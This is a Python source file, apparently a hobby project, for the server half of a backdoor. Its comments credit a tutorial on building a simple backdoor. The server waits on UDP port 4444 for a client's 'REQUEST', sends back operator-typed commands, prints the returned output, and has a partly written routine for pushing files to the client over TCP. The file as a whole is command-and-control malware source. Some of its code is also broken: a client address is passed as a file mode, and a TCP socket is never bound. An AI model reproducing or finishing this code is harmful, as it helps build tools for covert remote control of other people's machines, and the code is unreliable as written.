# https://docs.python.org/3/library/socket.html#socket.SOCK_DGRAM
# used this to learn how to use the socket.
# https://stackoverflow.com/questions/3283984/decode-hex-string-in-python-3
# Encoding/decoding a string to/from hex came from here.

# https://www.securecoding.com/blog/how-to-build-a-simple-backdoor-in-python/
# This file itself is an iteration on the server described here.
# https://www.w3schools.com/python/ref_file_read.asp
# File read instructions were pulled from here.

import socket
import string

buffer_size = 4096


def read_file_into_list(file, type):
    # https://www.w3schools.com/python/python_ref_file.asp
    # file input/management methods were referenced from here for this function.

    return_list = []
    counter = 0
    f = None

    try:
        f = open(file, type)

        current_input = f.read(buffer_size)
        # https://stackoverflow.com/questions/16678363/how-do-i-declare-an-empty-bytes-variable
        # used this to find the convert to byte trick.
        while current_input != b'':
            return_list.append(b'')
            return_list[counter] += current_input
            counter += 1
            current_input = f.read(buffer_size)

    except FileNotFoundError as e:
        print(e)
    finally:
        f.close()

    return return_list


def pull_list_from_str(input_string):
    return_list = ['']
    location = 0

    for c in input_string:
        # https://www.geeksforgeeks.org/string-whitespace-in-python/
        # Got c in string.whitespace from tutorial.
        if c in string.whitespace:
            location += 1
            return_list.append('')
        else:
            return_list[location] += c

    return return_list

HOST = 'localhost'
PORT = 4444
TCP_PORT = 4445

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind((HOST, PORT))
print('[+] Server Started')

try:
    while True:
        print('[+] Listening For Client Message ...')
        message, client_addr = s.recvfrom(buffer_size)
        message = message.decode()

        if message == 'REQUEST':
            print(f'[+] {client_addr} Client requested a command from the server')
            command_list = pull_list_from_str(input('Enter Command : '))

            if len(command_list) >= 1:
                s.sendto(command_list[0].encode(), client_addr)

                if command_list[0] == 'FILE' and len(command_list) >= 3:
                    # TODO: Modify this so it send the entire file in bits.
                    buffer_list = read_file_into_list(command_list[1], client_addr)
                    tcp_socket = socket.socket()
                    s.sendto(command_list[2].encode(), client_addr)
                    tcp_socket.listen(1)
                    # might need to change response if tcp address is something else.
                    tcp_client, tcp_address = tcp_socket.accept()

                    for list_item in buffer_list:
                        tcp_client.send(list_item)

            else:
                print('Could not interpret command.')

            print('[+] Command sent')
            output = s.recv(buffer_size)
            output = output.decode()
            print(f"Output: {output}")

        elif message == 'FILE':
            print('Request for file.')
        elif message == 'NAME':
            print('Request for filename.')
        else:
            print('received invalid request')

# Error types were looked up using pycharm autocomplete function.
except ConnectionAbortedError:
    print('Client ended connection')
except KeyboardInterrupt:
    print('Terminated session.')
finally:
    s.close()

